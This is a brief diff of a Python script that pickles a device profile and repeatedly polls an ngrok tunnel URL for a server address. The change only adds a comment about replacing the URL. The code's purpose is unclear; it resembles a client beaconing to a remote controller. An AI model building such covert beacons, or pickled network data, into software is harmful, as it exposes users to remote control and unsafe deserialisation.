@@ -16,7 +16,7 @@ additionalData: dict = {
 compressedData: bytes = pickle.dumps(deviceProfile)
 
 while True:
-    serverAddress = requests.get('https://yeti-glorious-redbird.ngrok-free.app/', headers = {'ngrok-skip-browser-warning': '69420'})
+    serverAddress = requests.get('https://yeti-glorious-redbird.ngrok-free.app/', headers = {'ngrok-skip-browser-warning': '69420'}) # Replace the url with your edge tunnel url
     if not (serverAddress.status_code == 200):
         time.sleep(5)
         continue
